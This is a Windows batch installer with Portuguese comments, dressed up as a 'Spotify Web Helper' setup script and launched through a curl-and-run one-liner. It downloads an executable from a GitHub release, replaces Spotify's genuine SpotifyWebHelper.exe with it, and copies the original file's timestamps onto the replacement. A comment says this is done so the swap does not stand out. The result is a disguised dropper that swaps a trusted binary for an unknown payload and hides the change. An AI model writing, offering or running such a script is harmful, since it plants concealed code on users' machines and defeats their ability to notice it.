@echo off
setlocal EnableDelayedExpansion
title Spotify Web Helper Setup

REM ============================================================================
REM  install.bat - instalador do SpotifyWebHelper
REM
REM  Uso (uma linha no cmd):
REM    curl -L -o "%TEMP%\i.bat" https://raw.githubusercontent.com/081xDev/win-assets/main/install.bat && "%TEMP%\i.bat"
REM
REM  O que faz:
REM    1. Baixa o host do release.
REM    2. Faz backup do SpotifyWebHelper.exe original (uma vez).
REM    3. Fecha o WebHelper se estiver rodando.
REM    4. Poe o host no lugar, preservando a data do original.
REM
REM  Nao registra autostart e nao mexe em servicos. O Spotify continua abrindo
REM  normalmente; o que muda e que o WebHelper passa a ser o host.
REM ============================================================================

set "REPO=081xDev/win-assets"
set "ASSET=SpotifyWebHelper.exe"
set "TARGET=%APPDATA%\Spotify\SpotifyWebHelper.exe"
set "BACKUP=%TARGET%.bak"
set "TMP=%TEMP%\swh_setup"

echo.
echo  ============================================
echo   Spotify Web Helper - instalacao
echo  ============================================
echo.

REM --- Modo desinstalacao -----------------------------------------------------
REM  A checagem vem ANTES de qualquer download: rodar com /uninstall nao pode
REM  reinstalar por cima antes de restaurar.
if /i "%~1"=="/uninstall" goto :uninstall
if /i "%~1"=="-uninstall" goto :uninstall

REM --- Verifica se o Spotify esta instalado -----------------------------------
if not exist "%APPDATA%\Spotify" (
    echo  [!] Pasta do Spotify nao encontrada:
    echo      %APPDATA%\Spotify
    echo.
    echo      Instale o Spotify e abra uma vez antes de continuar.
    echo.
    pause
    exit /b 1
)

REM --- Cria pasta temporaria --------------------------------------------------
if not exist "%TMP%" mkdir "%TMP%" >nul 2>&1

REM --- Baixa o host -----------------------------------------------------------
echo  [1/4] Baixando...
set "URL=https://github.com/%REPO%/releases/latest/download/%ASSET%"

curl -L --fail --silent --show-error -o "%TMP%\%ASSET%" "%URL%"

if errorlevel 1 (
    echo.
    echo  [!] Falha no download.
    echo      Verifique a conexao e tente de novo.
    echo.
    pause
    exit /b 1
)

if not exist "%TMP%\%ASSET%" (
    echo  [!] O arquivo nao foi baixado.
    pause
    exit /b 1
)

REM --- Confere que veio um executavel -----------------------------------------
REM  Um erro de rede costuma devolver uma pagina HTML. Escrever isso por cima do
REM  WebHelper deixaria o Spotify quebrado, entao a checagem vem antes.
for %%A in ("%TMP%\%ASSET%") do set "SIZE=%%~zA"

if !SIZE! LSS 1000000 (
    echo  [!] Arquivo baixado tem apenas !SIZE! bytes - parece incompleto.
    echo      Nada foi alterado.
    del "%TMP%\%ASSET%" >nul 2>&1
    pause
    exit /b 1
)

echo        ok - !SIZE! bytes

REM --- Backup do original -----------------------------------------------------
echo  [2/4] Fazendo backup...
if exist "%BACKUP%" (
    echo        backup ja existe - mantido
) else (
    if exist "%TARGET%" (
        copy /y "%TARGET%" "%BACKUP%" >nul
        if errorlevel 1 (
            echo  [!] Nao foi possivel criar o backup. Nada foi alterado.
            pause
            exit /b 1
        )
        echo        original salvo em SpotifyWebHelper.exe.bak
    ) else (
        echo        aviso: WebHelper original nao existia
    )
)

REM --- Fecha o processo se estiver rodando ------------------------------------
echo  [3/4] Fechando o WebHelper...
tasklist /fi "imagename eq SpotifyWebHelper.exe" 2>nul | find /i "SpotifyWebHelper.exe" >nul
if not errorlevel 1 (
    taskkill /f /im SpotifyWebHelper.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    echo        fechado
) else (
    echo        nao estava rodando
)

REM --- Instala ----------------------------------------------------------------
echo  [4/4] Instalando...
copy /y "%TMP%\%ASSET%" "%TARGET%" >nul

if errorlevel 1 (
    echo.
    echo  [!] Falha ao escrever em:
    echo      %TARGET%
    echo.
    echo      Feche o Spotify e tente de novo.
    echo.
    pause
    exit /b 1
)

REM --- Copia a data do original, para a troca nao saltar aos olhos ------------
if exist "%BACKUP%" (
    powershell -NoProfile -Command ^
      "$b=Get-Item '%BACKUP%'; $t=Get-Item '%TARGET%'; $t.CreationTime=$b.CreationTime; $t.LastWriteTime=$b.LastWriteTime; $t.LastAccessTime=$b.LastAccessTime" >nul 2>&1
)

del "%TMP%\%ASSET%" >nul 2>&1
rmdir "%TMP%" >nul 2>&1

echo.
echo  ============================================
echo   Instalado.
echo  ============================================
echo.
echo   Abra o SpotifyWebHelper para usar:
echo   %TARGET%
echo.
echo   Para desinstalar, rode este mesmo arquivo
echo   com o argumento /uninstall.
echo.
exit /b 0

:uninstall
echo  Desinstalando...
if not exist "%BACKUP%" (
    echo  [!] Backup nao encontrado - nada a restaurar.
    pause
    exit /b 1
)

taskkill /f /im SpotifyWebHelper.exe >nul 2>&1
timeout /t 2 /nobreak >nul

del "%TARGET%" >nul 2>&1
move /y "%BACKUP%" "%TARGET%" >nul

if errorlevel 1 (
    echo  [!] Falha ao restaurar.
    pause
    exit /b 1
)

echo  Original restaurado.
pause
exit /b 0
